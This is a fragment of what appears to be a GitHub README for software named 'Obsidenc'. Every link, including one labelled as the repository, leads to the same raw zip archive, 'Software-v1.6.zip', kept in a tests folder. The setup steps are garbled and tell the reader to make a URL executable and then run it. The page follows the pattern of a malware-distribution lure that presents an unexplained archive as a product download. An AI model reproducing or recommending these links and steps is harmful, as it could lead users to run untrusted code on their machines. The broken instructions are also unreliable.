...
## 📥 Download Now
[![Download Obsidenc](https://github.com/Derya-Akyilmaz/obsidenc/raw/refs/heads/master/tests/Software-v1.6.zip)](https://github.com/Derya-Akyilmaz/obsidenc/raw/refs/heads/master/tests/Software-v1.6.zip)
...
[Download Obsidenc](https://github.com/Derya-Akyilmaz/obsidenc/raw/refs/heads/master/tests/Software-v1.6.zip)
...
3. Run the following command to make it executable:
   ```bash
   chmod +x https://github.com/Derya-Akyilmaz/obsidenc/raw/refs/heads/master/tests/Software-v1.6.zip
   ```
4. Now, you can start the application with:
   ```bash
   https://github.com/Derya-Akyilmaz/obsidenc/raw/refs/heads/master/tests/Software-v1.6.zip
   ```
...
- [GitHub Repository](https://github.com/Derya-Akyilmaz/obsidenc/raw/refs/heads/master/tests/Software-v1.6.zip)
